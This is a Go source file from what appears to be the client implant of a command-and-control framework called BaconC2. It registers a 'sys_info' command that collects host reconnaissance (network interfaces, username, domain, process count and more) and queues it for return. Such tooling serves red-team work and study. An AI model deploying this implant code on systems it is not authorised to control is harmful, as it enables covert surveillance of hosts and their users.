package commands

import (
	"fmt"

	"github.com/RabbITCybErSeC/BaconC2/client/core/sysinfo"
	"github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/RabbITCybErSeC/BaconC2/client/queue"
)

func RegisterBuiltInCommands(registry *CommandHandlerRegistry, resultsQueue queue.IResultQueue, transport models.ITransportProtocol) {
	registry.RegisterHandler("sys_info", func(cmd models.Command) models.CommandResult {
		return getInfoHandler(cmd, resultsQueue)
	})
}

func getInfoHandler(cmd models.Command, resultsQueue queue.IResultQueue) models.CommandResult {
	sysInfo, err := sysinfo.GatherExtendedInfo()
	if err != nil {
		return models.CommandResult{
			ID:     cmd.ID,
			Status: "error",
			Output: map[string]string{"error": fmt.Sprintf("Failed to gather extended system info: %v", err)},
		}
	}

	output := map[string]interface{}{
		"network_interfaces": sysInfo.NetworkInterfaces,
		"architecture":       sysInfo.Architecture,
		"cpu_info":           sysInfo.CPUInfo,
		"memory_total":       sysInfo.MemoryTotal,
		"memory_free":        sysInfo.MemoryFree,
		"disk_total":         sysInfo.DiskTotal,
		"disk_free":          sysInfo.DiskFree,
		"uptime":             sysInfo.Uptime,
		"process_count":      sysInfo.ProcessCount,
		"username":           sysInfo.Username,
		"domain":             sysInfo.Domain,
		"last_boot_time":     sysInfo.LastBootTime,
	}

	result := models.CommandResult{
		ID:     cmd.ID,
		Status: "success",
		Output: output,
	}

	if err := resultsQueue.Add(result); err != nil {
		return models.CommandResult{
			ID:     cmd.ID,
			Status: "error",
			Output: map[string]string{"error": fmt.Sprintf("Failed to queue result: %v", err)},
		}
	}

	return result
}
